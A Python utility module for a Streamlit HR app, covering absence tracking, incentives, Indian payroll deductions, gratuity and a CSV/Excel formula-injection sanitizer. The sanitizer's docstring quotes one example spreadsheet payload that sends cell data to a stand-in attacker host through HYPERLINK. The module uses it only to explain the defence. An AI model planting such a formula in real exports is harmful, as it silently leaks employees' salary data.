"""
Shared utility functions for the HR Assistant app.
Keeping all business-logic / calculation functions here (instead of inside
each page) makes the app easier to maintain and test.
"""

import io
import pandas as pd
import streamlit as st


# --------------------------------------------------------------------------
# Navigation helpers
# --------------------------------------------------------------------------

def hide_default_sidebar_nav():
    """Hides Streamlit's automatic multipage sidebar list, so navigation is
    driven entirely by the nav cards / nav bar we render ourselves."""
    st.markdown(
        """
        <style>
        [data-testid="stSidebarNav"] {display: none;}
        </style>
        """,
        unsafe_allow_html=True,
    )


PAGES = [
    {"path": "Home.py", "label": "Home", "icon": "🗂️"},
    {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
    {"path": "pages/2_Incentive_Validator.py", "label": "Incentive Validator", "icon": "💰"},
    {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
    {"path": "pages/4_Gratuity_and_Advance.py", "label": "Gratuity & Advance", "icon": "🏦"},
]


def render_top_nav(active_label: str):
    """Renders a simple horizontal row of page links at the top of a page,
    used instead of the default sidebar navigation list."""
    hide_default_sidebar_nav()
    cols = st.columns(len(PAGES))
    for col, page in zip(cols, PAGES):
        with col:
            if page["label"] == active_label:
                st.markdown(f"**{page['icon']} {page['label']}**")
            else:
                st.page_link(page["path"], label=page["label"], icon=page["icon"])
    st.divider()


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------

def read_any_table(uploaded_file) -> pd.DataFrame:
    """Read an uploaded .csv / .xlsx / .xls file, always treating the first
    row as the header row. Returns a cleaned DataFrame (strips whitespace
    from column names)."""
    if uploaded_file is None:
        return pd.DataFrame()

    name = uploaded_file.name.lower()
    if name.endswith(".csv"):
        df = pd.read_csv(uploaded_file, header=0)
    else:
        df = pd.read_excel(uploaded_file, header=0, engine="openpyxl")

    df.columns = [str(c).strip() for c in df.columns]
    return df


def to_excel_bytes(sheets: dict) -> bytes:
    """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
    and return the raw bytes, ready for st.download_button.

    Every sheet is passed through `sanitize_dataframe_for_export()` first so
    that no exported file can carry a formula-injection payload (a common
    way sensitive data gets silently exfiltrated when a report is later
    re-opened in Excel/Sheets by someone else)."""
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
        for sheet_name, df in sheets.items():
            safe_name = str(sheet_name)[:31]  # Excel sheet name limit
            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
    return buffer.getvalue()


def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: str = None):
    st.download_button(
        label=label,
        data=to_excel_bytes({"Sheet1": df}),
        file_name=file_name,
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        key=key,
    )


# --------------------------------------------------------------------------
# Data-leak / security hardening
# --------------------------------------------------------------------------

_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
    """Neutralizes CSV/Excel formula-injection payloads before any data
    leaves the app as a downloadable file.

    If a cell value (typically from an uploaded sheet) starts with =, +, -,
    or @, Excel/Sheets will treat it as a formula when the exported file is
    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
    can silently exfiltrate adjacent salary data the moment someone opens
    the report. Prefixing such cells with a leading apostrophe forces them
    to render as plain text instead of executing.

    This only rewrites string cells that start with a trigger character —
    numbers, dates, and normal text are left untouched.
    """
    out = df.copy()
    for col in out.columns:
        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
            out[col] = out[col].apply(
                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
            )
    return out


def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
    """Returns a generic, user-facing error message that never echoes raw
    exception text back into the UI. Exception messages can accidentally
    contain fragments of the underlying data (e.g. a bad cell value quoted
    inside a pandas/KeyError message) — showing that verbatim in st.error
    is itself a small data leak. Log `exc` server-side via your own logging
    setup if you need the details; don't display it to end users.
    """
    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."


SENSITIVE_SESSION_KEYS = [
    "employee_db",
    "fulltime_data",
    "payroll_result",
    "gig_data",
    "gig_result",
]


def clear_sensitive_session_data():
    """Wipes all cached salary/employee data out of session_state. Streamlit
    keeps session_state in server memory for as long as the browser tab's
    session is alive — calling this lets you deliberately purge sensitive
    payroll data once you're done with it, rather than leaving it sitting
    in memory (e.g. on a shared workstation)."""
    for key in SENSITIVE_SESSION_KEYS:
        if key in st.session_state:
            del st.session_state[key]


def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
    if st.button(label):
        clear_sensitive_session_data()
        st.success("Session data cleared.")
        st.rerun()


# --------------------------------------------------------------------------
# 1. Long Absence Tracking
# --------------------------------------------------------------------------

def sample_attendance_muster() -> pd.DataFrame:
    """Small example attendance muster for download, showing the expected
    shape: employee identifier columns first (Employee ID, Employee Name,
    Branch), followed by one column per day with attendance marks
    (P=Present, A=Absent, WO=Weekly Off, L=Leave).

    This mirrors the row/column layout the Long Absence Tracker page
    expects — copy this shape when preparing your real muster."""
    days = [f"Day{i}" for i in range(1, 11)]

    rows = [
        {
            "Employee ID": "E001",
            "Employee Name": "Ravi Kumar",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "A", "P", "P", "WO", "P", "A", "P", "P"])),
        },
        {
            "Employee ID": "E002",
            "Employee Name": "Sita Sharma",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "P", "P", "P", "WO", "P", "P", "P", "P"])),
        },
        {
            "Employee ID": "E003",
            "Employee Name": "Mohan Das",
            "Branch": "Whitefield",
            **dict(zip(days, ["A", "A", "A", "A", "A", "WO", "A", "A", "A", "A"])),
        },
    ]
    return pd.DataFrame(rows)


def count_absences(df: pd.DataFrame, id_cols: list, absence_marker: str = "A") -> pd.DataFrame:
    """Given an attendance muster where `id_cols` identify the employee and
    all other columns are day-wise attendance marks, count how many times
    `absence_marker` (default 'A') appears for each employee.

    Also captures the columns that could not be counted (in case some
    non-date extra columns sneak in) — but by default we just count on
    every non-id column, so make sure the caller has picked id_cols
    correctly.
    """
    day_cols = [c for c in df.columns if c not in id_cols]

    def count_row(row):
        vals = row[day_cols].astype(str).str.strip().str.upper()
        return (vals == absence_marker.upper()).sum()

    result = df[id_cols].copy()
    result["Total_Absent_Days"] = df.apply(count_row, axis=1)
    result["Total_Days_In_Muster"] = len(day_cols)
    return result


def categorize_absences(df: pd.DataFrame, thresholds: list) -> pd.DataFrame:
    """thresholds: list of (label, min_days, max_days_or_None) tuples,
    evaluated in order. max_days_or_None means "and above".
    Adds a 'Absence_Category' column to df (based on Total_Absent_Days).
    """

    def classify(days):
        for label, min_d, max_d in thresholds:
            if max_d is None:
                if days >= min_d:
                    return label
            else:
                if min_d <= days <= max_d:
                    return label
        return "Not Flagged"

    out = df.copy()
    out["Absence_Category"] = out["Total_Absent_Days"].apply(classify)
    return out


DEFAULT_ABSENCE_THRESHOLDS = [
    ("Informed Leave (3-4 days)", 3, 4),
    ("To Be Checked (5-20 days)", 5, 20),
    ("Probable Exit Case (>20 days)", 21, None),
]


# --------------------------------------------------------------------------
# 2. Incentive Validator (Bulk Upload)
# --------------------------------------------------------------------------

INCENTIVE_TEMPLATE_COLUMNS = [
    "Branch Name",
    "Bus Maid Count",
    "Washroom Maid Count",
    "Max Washroom Incentive",
    "Max Bus Incentive",
]


def sample_incentive_template() -> pd.DataFrame:
    return pd.DataFrame(
        [
            {
                "Branch Name": "Koramangala",
                "Bus Maid Count": 4,
                "Washroom Maid Count": 6,
                "Max Washroom Incentive": 3000,
                "Max Bus Incentive": 2000,
            },
            {
                "Branch Name": "Whitefield",
                "Bus Maid Count": 2,
                "Washroom Maid Count": 5,
                "Max Washroom Incentive": 2500,
                "Max Bus Incentive": 1500,
            },
        ]
    )


def compute_incentives(
    df: pd.DataFrame,
    rate_per_washroom_maid: float,
    rate_per_bus_maid: float,
) -> pd.DataFrame:
    """Computes incentive per branch as:
        Washroom Incentive = min(Washroom Maid Count * rate, Max Washroom Incentive)
        Bus Incentive       = min(Bus Maid Count * rate, Max Bus Incentive)
        Total Incentive     = Washroom Incentive + Bus Incentive

    NOTE: The exact incentive formula was not specified in this session, so
    a standard "per-maid rate capped at branch max" logic is used. Adjust
    `rate_per_washroom_maid` / `rate_per_bus_maid` in the sidebar, or edit
    this function directly if your actual policy differs (e.g. slab-based
    instead of linear-per-maid).
    """
    out = df.copy()

    for col in INCENTIVE_TEMPLATE_COLUMNS:
        if col not in out.columns:
            raise ValueError(f"Missing required column: '{col}'")

    out["Calculated Washroom Incentive"] = (
        out["Washroom Maid Count"] * rate_per_washroom_maid
    ).clip(upper=None)
    out["Calculated Washroom Incentive"] = out[
        ["Calculated Washroom Incentive", "Max Washroom Incentive"]
    ].min(axis=1)

    out["Calculated Bus Incentive"] = out["Bus Maid Count"] * rate_per_bus_maid
    out["Calculated Bus Incentive"] = out[
        ["Calculated Bus Incentive", "Max Bus Incentive"]
    ].min(axis=1)

    out["Total Incentive"] = (
        out["Calculated Washroom Incentive"] + out["Calculated Bus Incentive"]
    )

    out["Capped? (Washroom)"] = (
        out["Washroom Maid Count"] * rate_per_washroom_maid
    ) > out["Max Washroom Incentive"]
    out["Capped? (Bus)"] = (out["Bus Maid Count"] * rate_per_bus_maid) > out[
        "Max Bus Incentive"
    ]

    return out


# --------------------------------------------------------------------------
# 3. Payroll: Full-time employees (PF + ESIC) & Gig workers (TDS)
# --------------------------------------------------------------------------

def compute_fulltime_payroll(
    df: pd.DataFrame,
    basic_col: str,
    hra_col: str = None,
    other_allow_col: str = None,
    pf_wage_cap: float = 15000,
    apply_pf_cap: bool = True,
    pf_employee_pct: float = 12.0,
    pf_employer_pct: float = 12.0,
    esic_threshold: float = 21000,
    esic_employee_pct: float = 0.75,
    esic_employer_pct: float = 3.25,
) -> pd.DataFrame:
    """Computes Gross, PF (employee + employer) and ESIC (employee + employer)
    and Net Pay for full-time employees.

    Statutory notes (verify current rates before relying on this for actual
    payroll compliance — rates/thresholds can change):
      - PF: 12% of Basic (employee), 12% of Basic (employer), employee PF
        wage capped at ₹15,000/month by default (toggle-able).
      - ESIC: applicable only if Gross <= ₹21,000/month.
        Employee 0.75%, Employer 3.25% of Gross.
    """
    out = df.copy()

    hra = out[hra_col] if hra_col and hra_col in out.columns else 0
    other = out[other_allow_col] if other_allow_col and other_allow_col in out.columns else 0

    out["Gross Salary"] = out[basic_col] + hra + other

    pf_wage = out[basic_col].clip(upper=pf_wage_cap) if apply_pf_cap else out[basic_col]
    out["PF Wage"] = pf_wage
    out["PF (Employee)"] = pf_wage * pf_employee_pct / 100
    out["PF (Employer)"] = pf_wage * pf_employer_pct / 100

    esic_applicable = out["Gross Salary"] <= esic_threshold
    out["ESIC Applicable"] = esic_applicable
    out["ESIC (Employee)"] = 0.0
    out["ESIC (Employer)"] = 0.0
    out.loc[esic_applicable, "ESIC (Employee)"] = (
        out.loc[esic_applicable, "Gross Salary"] * esic_employee_pct / 100
    )
    out.loc[esic_applicable, "ESIC (Employer)"] = (
        out.loc[esic_applicable, "Gross Salary"] * esic_employer_pct / 100
    )

    out["Total Employee Deductions"] = out["PF (Employee)"] + out["ESIC (Employee)"]
    out["Net Pay (Employee Take-home)"] = out["Gross Salary"] - out["Total Employee Deductions"]
    out["Total Employer Cost (CTC add-on)"] = out["PF (Employer)"] + out["ESIC (Employer)"]

    return out


def compute_gig_worker_billing(
    df: pd.DataFrame,
    amount_col: str,
    tds_pct: float = 1.0,
) -> pd.DataFrame:
    """Gig / contract worker monthly billing:
        TDS Amount     = amount * tds_pct%
        Billing Amount = amount + TDS Amount   (TDS added on top per requirement)

    This matches the stated requirement: '1% TDS to be added as monthly
    billing amount'. If your actual policy instead grosses-up so the worker
    nets a fixed amount after TDS deduction, use amount / (1 - tds_pct/100)
    instead — flagged here as an assumption to confirm.
    """
    out = df.copy()
    out["TDS Amount"] = out[amount_col] * tds_pct / 100
    out["Monthly Billing Amount"] = out[amount_col] + out["TDS Amount"]
    return out


# --------------------------------------------------------------------------
# 4. Gross <-> In-Hand converters
# --------------------------------------------------------------------------

def solve_gross_for_net_fulltime(
    target_net: float,
    fixed_allowances: float = 0.0,
    pf_wage_cap: float = 15000,
    apply_pf_cap: bool = True,
    pf_employee_pct: float = 12.0,
    pf_employer_pct: float = 12.0,
    esic_threshold: float = 21000,
    esic_employee_pct: float = 0.75,
    esic_employer_pct: float = 3.25,
    tolerance: float = 1.0,
    max_iterations: int = 100,
) -> dict:
    """Reverse calculation: given a target monthly in-hand (net take-home)
    amount, finds the Basic Salary (and resulting Gross) that would produce
    it, using bisection search.

    This can't be solved with a plain formula because PF is capped at a
    wage ceiling and ESIC only applies below a gross threshold (₹21,000
    by default) — so Net(Gross) is a piecewise, not linear, function.
    Bisection works because Net(Gross) is monotonically non-decreasing
    (crossing the ESIC threshold only ever *removes* a deduction, which can
    only increase net pay, never decrease it).

    `fixed_allowances` = HRA + Other Allowances, treated as a fixed rupee
    amount added on top of Basic for Gross, but NOT subject to PF (only
    Basic is PF wage). Set to 0 if you want the entire amount to be Basic.
    """

    def net_for_basic(basic):
        df = pd.DataFrame([{"Basic": basic, "Other": fixed_allowances}])
        result = compute_fulltime_payroll(
            df, "Basic", None, "Other",
            pf_wage_cap=pf_wage_cap, apply_pf_cap=apply_pf_cap,
            pf_employee_pct=pf_employee_pct, pf_employer_pct=pf_employer_pct,
            esic_threshold=esic_threshold,
            esic_employee_pct=esic_employee_pct, esic_employer_pct=esic_employer_pct,
        )
        return result.iloc[0]

    low, high = 0.0, max(target_net * 2.0, target_net + 100000.0) + 100000.0
    mid = low
    row = net_for_basic(high)
    if row["Net Pay (Employee Take-home)"] < target_net:
        high *= 3  # safety expansion if target is unreachable within initial bound

    for _ in range(max_iterations):
        mid = (low + high) / 2
        row = net_for_basic(mid)
        net = row["Net Pay (Employee Take-home)"]
        if abs(net - target_net) <= tolerance:
            break
        if net < target_net:
            low = mid
        else:
            high = mid

    final_row = net_for_basic(mid)
    return {
        "Basic": mid,
        "Gross": final_row["Gross Salary"],
        "row": final_row,
    }


def gig_inhand_to_billing(inhand_amount: float, tds_pct: float = 1.0) -> dict:
    """Forward: worker's in-hand payment -> billing amount (Amount + TDS)."""
    tds_amount = inhand_amount * tds_pct / 100
    return {
        "In-Hand Amount": inhand_amount,
        "TDS Amount": tds_amount,
        "Billing Amount": inhand_amount + tds_amount,
    }


def gig_billing_to_inhand(billing_amount: float, tds_pct: float = 1.0) -> dict:
    """Reverse: known billing amount -> worker's in-hand payment.
    Since Billing = Amount * (1 + tds%/100), Amount = Billing / (1 + tds%/100).
    """
    inhand = billing_amount / (1 + tds_pct / 100)
    return {
        "Billing Amount": billing_amount,
        "TDS Amount": billing_amount - inhand,
        "In-Hand Amount": inhand,
    }


# --------------------------------------------------------------------------
# 5. Gratuity Calculator
# --------------------------------------------------------------------------

def compute_years_of_service(doj, dol, round_half_year_up: bool = True) -> float:
    """Completed years of service between Date of Joining and Date of
    Leaving (or 'as of' date). Uses the standard gratuity rounding rule:
    if the leftover period beyond completed full years is 6 months or
    more, round up to the next full year; otherwise it's dropped.
    `doj` and `dol` should be datetime.date / datetime.datetime objects.
    """
    total_days = (dol - doj).days
    total_years = total_days / 365.25
    completed_years = int(total_years)
    remainder = total_years - completed_years
    if round_half_year_up and remainder >= 0.5:
        completed_years += 1
    return completed_years


def compute_gratuity(
    last_drawn_basic_da: float,
    years_of_service: float,
    covered_under_act: bool = True,
    min_years_for_eligibility: float = 5,
    exempt_from_min_years: bool = False,
    max_limit: float = 2000000,
) -> dict:
    """Statutory gratuity calculation under the Payment of Gratuity Act, 1972.

        Gratuity = (Last Drawn Basic+DA x 15 x Years of Service) / 26   [covered establishments]
        Gratuity = (Last Drawn Basic+DA x 15 x Years of Service) / 30   [non-covered, common practice]

    Eligibility normally requires 5+ years of continuous service, except
    in cases of death or disablement (`exempt_from_min_years=True`).

    `max_limit` is the statutory tax-exemption ceiling — verify the
    current limit before relying on this for compliance, as it can change
    (₹20,00,000 was the limit at last update, used as the default here).

    NOTE: this is a standard-case calculator. It does not account for
    every edge case in the Act (e.g. seasonal establishments use a
    different divisor, some awards/settlements override the formula).
    Confirm with your compliance team for non-standard cases.
    """
    eligible = exempt_from_min_years or years_of_service >= min_years_for_eligibility
    divisor = 26 if covered_under_act else 30

    if not eligible:
        return {
            "Eligible": False,
            "Years of Service": years_of_service,
            "Gratuity (Uncapped)": 0.0,
            "Gratuity Payable": 0.0,
            "Capped": False,
            "Note": f"Not eligible — requires {min_years_for_eligibility}+ years of service "
                    f"(unless death/disablement exemption applies).",
        }

    gratuity_raw = (last_drawn_basic_da * 15 * years_of_service) / divisor
    gratuity_capped = min(gratuity_raw, max_limit)

    return {
        "Eligible": True,
        "Years of Service": years_of_service,
        "Gratuity (Uncapped)": round(gratuity_raw, 2),
        "Statutory Max Limit": max_limit,
        "Gratuity Payable": round(gratuity_capped, 2),
        "Capped": gratuity_raw > max_limit,
        "Note": "",
    }


# --------------------------------------------------------------------------
# 6. ERP/OIS-based Paysheet Lookup (for Salary Advance processing)
# --------------------------------------------------------------------------

def validate_erp_id(erp_id: str, expected_length: int = 11) -> bool:
    """Validates an ERP/OIS employee code: must be all digits and exactly
    `expected_length` characters long (default 11, per the stated format)."""
    if erp_id is None:
        return False
    cleaned = str(erp_id).strip()
    return cleaned.isdigit() and len(cleaned) == expected_length


def lookup_employee_by_erp(df: pd.DataFrame, erp_col: str, erp_id: str) -> pd.DataFrame:
    """Returns all rows in `df` whose `erp_col` value matches `erp_id`
    exactly (compared as trimmed strings, so numeric-vs-text formatting
    differences in the source sheet don't cause false misses)."""
    target = str(erp_id).strip()
    matches = df[df[erp_col].astype(str).str.strip() == target]
    return matches
